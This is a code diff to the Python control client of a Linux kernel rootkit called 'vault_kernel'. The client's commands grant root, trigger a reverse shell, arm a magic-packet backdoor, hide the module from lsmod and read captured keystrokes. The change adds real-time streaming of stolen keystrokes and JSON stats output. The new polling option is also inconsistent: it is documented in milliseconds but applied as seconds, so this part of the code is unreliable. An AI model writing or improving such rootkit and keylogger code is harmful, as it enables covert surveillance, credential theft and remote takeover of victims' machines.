@@ -17,7 +17,8 @@ Commands:
     give-root [pid]       Escalate a process to root (default: self)
     shell <ip:port>       Trigger reverse shell to remote host
     magic <word>          Set magic packet trigger word
-    keylog                Read captured keystrokes
+    keylog [--follow] [--interval MS]
+                          Read captured keystrokes (stream with --follow)
     keylog-clear          Clear the keylogger buffer
     hide-module           Hide rootkit from lsmod
     unhide-module         Make rootkit visible in lsmod
@@ -30,6 +31,8 @@ import os
 import sys
 import stat as stat_mod
 import struct
+import time
+import json
 import fcntl
 import errno
 import argparse
@@ -37,7 +40,7 @@ import argparse
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
 SYSFS_MODULE = "/sys/module/vault_kernel"
-CLIENT_VERSION = "3.4"
+CLIENT_VERSION = "3.5"
 
 
 def _port_arg(value):
@@ -356,14 +359,36 @@ class VaultKernelClient:
             print(f"[+] Magic packet backdoor enabled: '{word}'")
         self._close()
 
-    def keylog_read(self):
-        """Read captured keystrokes."""
+    def keylog_read(self, follow=False, interval=0.5):
+        """Read captured keystrokes; with follow=True, stream new
+        keystrokes until Ctrl-C.  The module's buffer shifts left when
+        full, so a suffix diff is printed while the common prefix
+        holds and a full replay when it wraps."""
         self._open()
-        buf = bytearray(4096)
-        if self._ioctl(IOCTL_KEYLOG_READ, buf):
-            output = buf.rstrip(b'\x00').decode(errors='replace')
-            print(f"[*] Keystroke log:\n{output}" if output else "[*] (no keystrokes captured)")
-        self._close()
+        prev = ""
+        try:
+            while True:
+                buf = bytearray(4096)
+                if not self._ioctl(IOCTL_KEYLOG_READ, buf):
+                    break
+                cur = buf.rstrip(b'\x00').decode(errors='replace')
+                if cur != prev:
+                    if follow:
+                        if len(cur) >= len(prev) and cur.startswith(prev):
+                            print(cur[len(prev):], end='', flush=True)
+                        else:
+                            print("\n" + cur, end='', flush=True)
+                        prev = cur
+                    else:
+                        print(f"[*] Keystroke log:\n{cur}" if cur
+                              else "[*] (no keystrokes captured)")
+                if not follow:
+                    break
+                time.sleep(interval)
+        except KeyboardInterrupt:
+            print("\n[*] Follow stopped")
+        finally:
+            self._close()
 
     def keylog_clear(self):
         """Clear keylogger buffer."""
@@ -413,13 +438,31 @@ class VaultKernelClient:
             print("[*] vault_kernel kernel module is NOT loaded")
             print("    Run: sudo insmod vault_kernel.ko")
 
-    def stats(self):
-        """Read module statistics via IOCTL_GET_STATS."""
+    def stats(self, as_json=False):
+        """Read module statistics via IOCTL_GET_STATS; optionally
+        re-emit as machine-readable JSON (numbers as numbers)."""
         self._open()
         buf = bytearray(4096)
         if self._ioctl(IOCTL_GET_STATS, buf):
             output = buf.rstrip(b'\x00').decode(errors='replace')
-            print(output if output else "(no stats returned)")
+            if not output:
+                print("(no stats returned)")
+            elif as_json:
+                raw = {}
+                for line in output.splitlines():
+                    line = line.strip()
+                    if '=' in line:
+                        key, _, value = line.partition('=')
+                        raw[key] = value
+                out = {}
+                for key, value in raw.items():
+                    try:
+                        out[key] = int(value)
+                    except ValueError:
+                        out[key] = value
+                print(json.dumps(out, indent=2, sort_keys=True))
+            else:
+                print(output)
         self._close()
 
     def magic_encode(self, word, port):
@@ -465,7 +508,9 @@ def main():
     sp.add_argument("port", type=_port_arg, help="Port number (1-65535)")
 
     subparsers.add_parser("list", help="List all hidden items")
-    subparsers.add_parser("stats", help="Show module stats")
+    sp = subparsers.add_parser("stats", help="Show module stats")
+    sp.add_argument("--json", action="store_true", dest="as_json",
+                    help="emit stats as machine-readable JSON")
 
     sp = subparsers.add_parser("shell", help="Trigger reverse shell")
     sp.add_argument("target", help="IP:PORT for reverse shell")
@@ -477,7 +522,11 @@ def main():
     sp.add_argument("word", help="Trigger word")
     sp.add_argument("port", type=_port_arg, help="Callback port (1-65535)")
 
-    subparsers.add_parser("keylog", help="Read captured keystrokes")
+    sp = subparsers.add_parser("keylog", help="Read captured keystrokes")
+    sp.add_argument("--follow", action="store_true",
+                    help="stream new keystrokes until Ctrl-C")
+    sp.add_argument("--interval", type=float, default=0.5, metavar="MS",
+                    help="poll interval in ms for --follow (default 500, min 50)")
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
     subparsers.add_parser("hide-module", help="Hide from lsmod")
     subparsers.add_parser("unhide-module", help="Reveal in lsmod")
@@ -516,7 +565,7 @@ def main():
         elif args.command == "list":
             client.list_hidden()
         elif args.command == "stats":
-            client.stats()
+            client.stats(as_json=args.as_json)
         elif args.command == "shell":
             client.shell(args.target)
         elif args.command == "magic":
@@ -524,7 +573,8 @@ def main():
         elif args.command == "magic-encode":
             client.magic_encode(args.word, args.port)
         elif args.command == "keylog":
-            client.keylog_read()
+            interval = max(args.interval, 0.05)
+            client.keylog_read(follow=args.follow, interval=interval)
         elif args.command == "keylog-clear":
             client.keylog_clear()
         elif args.command == "hide-module":
